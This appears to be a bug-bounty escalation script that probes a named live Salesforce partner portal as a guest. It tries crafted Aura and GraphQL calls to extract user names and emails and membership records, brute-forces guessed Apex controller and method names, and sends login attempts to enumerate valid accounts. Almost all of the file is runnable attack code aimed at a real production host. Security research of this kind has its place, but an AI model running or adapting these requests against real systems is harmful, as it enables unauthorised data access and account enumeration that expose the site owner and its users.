#!/usr/bin/env bash
# Session 12 — Three unexplored escalation paths for M002
# Priority: executeGraphQL format recovery → custom Apex controllers → direct GraphQL REST
# Run: bash PI-ESCALATION-session12.sh 2>&1 | tee /tmp/s12-escalation.txt
# Date: 2026-06-22

FWUID="cmpKNldRZXRSMkdjemxQdjBkbl9uQWtVMjdnTGFERUU2S3FfSVdrcU92bkExNC4xOTIuODM4ODYwOA"

# Refresh cookies
curl -skL -c /tmp/cpp-s12-cookies.txt "https://cpp.marriott.com/s/" -o /dev/null
echo "=== Cookies refreshed ==="

# ============================================================
# PATH 1: executeGraphQL with query as SEPARATE FORM FIELD
# Hypothesis: session 9 returned state=SUCCESS+ValidationError because the
# query was passed as a top-level form field `query=...` (not inside params).
# The Aura executeGraphQL proxy reads `$_POST['query']` directly, not params.query.
# If true: fix the query syntax → get real records → HIGH/CRITICAL.
# ============================================================
echo ""
echo "===== PATH 1: executeGraphQL — query as SEPARATE FORM FIELD ====="
echo "(Hypothesis: action reads query from POST body, not from params object)"
echo ""

# 1a: query as separate field, params={} empty
echo "--- 1a: Separate field, params={}, User query (correct syntax) ---"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s12-cookies.txt \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"UNKNOWN","params":{}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  --data-urlencode 'query=query q{uiapi{query{User{edges{node{Id Name{value}Email{value}}}totalCount}}}}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    perf = obj.get('perfSummary',{})
    print(f'actionsTotal={perf.get(\"actionsTotal\",0)}')
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        print(f'state={state}')
        print(f'returnValue={json.dumps(rv)[:800]}')
        if err:
            print(f'error={json.dumps(err)[:500]}')
except Exception as e:
    print(f'parse_err={e}')
    print(raw[:500])
" 2>&1

echo ""
echo "--- 1b: Separate field, params has empty query string, User ---"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s12-cookies.txt \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"UNKNOWN","params":{"query":""}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  --data-urlencode 'query=query q{uiapi{query{User{edges{node{Id Name{value}Email{value}}}totalCount}}}}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    perf = obj.get('perfSummary',{})
    print(f'actionsTotal={perf.get(\"actionsTotal\",0)}')
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        print(f'state={state}')
        print(f'returnValue={json.dumps(rv)[:800]}')
        if err:
            print(f'error={json.dumps(err)[:500]}')
except Exception as e:
    print(f'parse_err={e}')
    print(raw[:500])
" 2>&1

echo ""
echo "--- 1c: Separate field, NetworkMember query (different object) ---"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s12-cookies.txt \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"UNKNOWN","params":{}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  --data-urlencode 'query=query q{uiapi{query{NetworkMember{edges{node{Id MemberId{value}NetworkId{value}Status{value}}}totalCount}}}}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    perf = obj.get('perfSummary',{})
    print(f'actionsTotal={perf.get(\"actionsTotal\",0)}')
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        print(f'state={state}')
        print(f'returnValue={json.dumps(rv)[:800]}')
        if err:
            print(f'error={json.dumps(err)[:500]}')
except Exception as e:
    print(f'parse_err={e}')
    print(raw[:500])
" 2>&1

# ============================================================
# PATH 2: Direct Salesforce GraphQL REST endpoint with guest cookie
# Even though REST SOQL (/services/data/v55.0/query) returns 401 with guest cookie,
# the GraphQL endpoint (/services/data/v55.0/graphql) was added in API v55 and may
# have different auth handling — especially in Experience Cloud guest context.
# ============================================================
echo ""
echo "===== PATH 2: DIRECT REST GRAPHQL ENDPOINT ====="
echo "(REST SOQL returns 401, but GraphQL was added later with different auth model)"
echo ""

echo "--- 2a: GET /services/data/v55.0/graphql with guest cookie ---"
curl -sk -o /dev/null -w "HTTP %{http_code} / %{size_download}B\n" \
  "https://cpp.marriott.com/services/data/v55.0/graphql" \
  -b /tmp/cpp-s12-cookies.txt

echo ""
echo "--- 2b: POST /services/data/v55.0/graphql with JSON body + guest cookie ---"
curl -sk -X POST "https://cpp.marriott.com/services/data/v55.0/graphql" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -b /tmp/cpp-s12-cookies.txt \
  -d '{"query":"query q{uiapi{query{User{edges{node{Id Name{value}Email{value}}}totalCount}}}}","variables":{}}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw)
    print(json.dumps(obj, indent=2)[:600])
except:
    print(raw[:500])
" 2>&1

echo ""
echo "--- 2c: POST /services/data/v57.0/graphql (newer API version) ---"
curl -sk -X POST "https://cpp.marriott.com/services/data/v57.0/graphql" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -b /tmp/cpp-s12-cookies.txt \
  -d '{"query":"query q{uiapi{query{User{edges{node{Id Name{value}Email{value}}}totalCount}}}}","variables":{}}' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw)
    print(json.dumps(obj, indent=2)[:600])
except:
    print(raw[:500])
" 2>&1

# ============================================================
# PATH 3: Custom Apex controllers — Phase C from session 9
# These were in the runbook but results were never explicitly confirmed.
# Custom controllers often lack `with sharing` and may expose records.
# Using the fixed parse function to get explicit output.
# ============================================================
echo ""
echo "===== PATH 3: CUSTOM APEX CONTROLLER PROBE ====="
echo "(CPP = Community Partner Portal — controllers likely named after franchise/partner functions)"
echo ""

aura_direct() {
  local descriptor="$1"
  local params="$2"
  curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b /tmp/cpp-s12-cookies.txt \
    --data-urlencode "message={\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"${descriptor}\",\"callingDescriptor\":\"UNKNOWN\",\"params\":${params}}]}" \
    --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
    --data-urlencode 'aura.pageURI=/s/' \
    --data-urlencode 'aura.token=undefined'
}

# Probe each controller — report only interesting (non-boring) results
probe_apex() {
  local ctrl="$1"
  local method="$2"
  local params="${3:-{}}"
  local result
  result=$(aura_direct "apex://${ctrl}/ACTION\$${method}" "${params}" \
    | python3 -c "
import sys, json
raw = sys.stdin.read()
size = len(raw)
try:
    obj = json.loads(raw[raw.index('{'):])
    perf = obj.get('perfSummary',{})
    at = perf.get('actionsTotal', 0)
    for a in obj.get('actions', []):
        state = a.get('state', '?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        err_msg = ''
        if isinstance(err, list) and err:
            err_msg = err[0].get('message','') if isinstance(err[0],dict) else str(err[0])
        # Only report interesting results (not no-such-type/action errors)
        boring = ['no action found','no such type','no such column','does not exist',
                  'invalid type','nonexistent','not found']
        if state == 'SUCCESS':
            print(f'*** SUCCESS *** apex://{ctrl}/{method} size={size}B rv={str(rv)[:200]}')
        elif state == 'ERROR' and err_msg:
            if not any(b.lower() in err_msg.lower() for b in boring):
                print(f'INTERESTING: apex://{ctrl}/{method} | {err_msg[:150]}')
        # If actionsTotal=0 (framework block), nothing printed = expected
except Exception:
    pass
" 2>/dev/null)
  [ -n "$result" ] && echo "$result"
}

echo "--- 3a: CPP-themed controllers (partner portal names) ---"
for CTRL in \
  "PartnerPortalController" \
  "CPPController" \
  "CommunityPartnerController" \
  "FranchisePortalController" \
  "MarriottPartnerController" \
  "HotelPartnerController" \
  "PropertyManagementController" \
  "PartnerAccountController" \
  "FranchiseeController" \
  "OwnerPortalController" \
  "OwnerServicesController" \
  "HotelOwnerController" \
  "PartnerDashboardController" \
  "PortalUserController" \
  "PartnerUserController"; do
  for METHOD in "getProperties" "getPartners" "search" "getData" "getList" "getRecords" "init" "getAccounts" "getUsers" "getPropertyList" "getPortalData"; do
    probe_apex "$CTRL" "$METHOD" '{"pageSize":5,"searchTerm":"","page":1}'
  done
done
echo "(no output above = all returned actions:[] Aura-block or boring errors — expected)"

echo ""
echo "--- 3b: Salesforce standard community controllers ---"
for CTRL_METHOD in \
  "NetworkMemberController/getMembership" \
  "CommunityMembersController/getMembers" \
  "UserProfileMenuController/getUserProfileMenu" \
  "ChatterController/getUsers" \
  "ChatterUsersController/getUsers" \
  "NetworkController/getNetworkMembers" \
  "UserProfileController/getUserProfile"; do
  CTRL="${CTRL_METHOD%%/*}"
  METHOD="${CTRL_METHOD##*/}"
  PREFIX="aura://"
  result=$(curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b /tmp/cpp-s12-cookies.txt \
    --data-urlencode "message={\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"${PREFIX}${CTRL}/ACTION\$${METHOD}\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"pageSize\":10,\"pageToken\":null}}]}" \
    --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
    --data-urlencode 'aura.pageURI=/s/' \
    --data-urlencode 'aura.token=undefined' \
    | python3 -c "
import sys, json
raw = sys.stdin.read()
size = len(raw)
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions', []):
        state = a.get('state','?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        err_msg = err[0].get('message','') if isinstance(err,list) and err and isinstance(err[0],dict) else ''
        if state == 'SUCCESS' and rv:
            print(f'*** SUCCESS *** ${PREFIX}${CTRL}/{METHOD} size={size}B rv={str(rv)[:300]}')
        elif state == 'ERROR':
            boring = ['no action found','no such type','nonexistent','not found','invalid type']
            if not any(b.lower() in err_msg.lower() for b in boring):
                print(f'INTERESTING: ${PREFIX}${CTRL}/{METHOD} | {err_msg[:150]}')
except: pass
" 2>/dev/null)
  [ -n "$result" ] && echo "$result"
done
echo "(no output above = all blocked — expected)"

echo ""
echo "--- 3c: CommLoginController — does it expose different error for valid users? ---"
# Re-test with fwuid confirmed valid (session 7 showed 11279B identical, but session 9+ shows 11092B)
# If error messages differ → user enumeration (Low-Medium chain)
echo "Test 1 — obviously fake:"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s12-cookies.txt \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"apex://CommLoginController/ACTION$login","callingDescriptor":"UNKNOWN","params":{"username":"zzz_test_99999@notreal-xyz.com","password":"INVALID!","startUrl":""}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    at = obj.get('perfSummary',{}).get('actionsTotal',0)
    print(f'actionsTotal={at}')
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        err_msg = err[0].get('message','') if isinstance(err,list) and err and isinstance(err[0],dict) else ''
        print(f'state={state} rv={str(rv)[:200]} err={err_msg[:200]}')
except: print(raw[:300])
" 2>&1

echo ""
echo "Test 2 — Marriott corporate domain:"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s12-cookies.txt \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"apex://CommLoginController/ACTION$login","callingDescriptor":"UNKNOWN","params":{"username":"test@marriott.com","password":"INVALID!","startUrl":""}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    at = obj.get('perfSummary',{}).get('actionsTotal',0)
    print(f'actionsTotal={at}')
    for a in obj.get('actions',[]):
        state = a.get('state','?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        err_msg = err[0].get('message','') if isinstance(err,list) and err and isinstance(err[0],dict) else ''
        print(f'state={state} rv={str(rv)[:200]} err={err_msg[:200]}')
except: print(raw[:300])
" 2>&1

echo ""
echo "=== DONE: $(date) ==="
echo "=== Decision: ==="
echo "PATH 1 state=SUCCESS + data → executeGraphQL works → STOP here, getRecord pivot → HIGH/CRITICAL"
echo "PATH 2 REST GraphQL 200 with data → direct record access → HIGH/CRITICAL"
echo "PATH 3 apex controller SUCCESS → record access via custom controller → HIGH"
echo "ALL state=ERROR/blocked → M002 is definitively Medium. SUBMIT NOW."
